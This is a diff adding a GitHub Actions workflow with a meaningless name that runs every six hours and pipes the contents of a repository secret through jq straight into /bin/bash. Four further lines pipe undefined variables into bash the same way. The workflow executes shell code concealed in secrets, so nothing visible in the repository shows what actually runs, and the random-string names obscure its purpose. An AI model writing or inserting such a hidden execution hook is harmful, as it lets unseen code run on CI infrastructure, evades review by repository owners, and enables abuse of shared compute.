@@ -1,0 +1,20 @@
+name: stoodpoliteness
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: stoodpoliteness
+        env:
+          hssj238: ${{ secrets.hssj238 }}
+        run: |
+          echo $hssj238 | jq -r .e84514 | /bin/bash
+          echo $f19556 | jq -r .hnbwx4989 | /bin/bash
+          echo $fuh5 | jq -r .cs44 | /bin/bash
+          echo $tes27 | jq -r .ujn43914 | /bin/bash
+          echo $xpxy3 | jq -r .gq70636 | /bin/bash
+
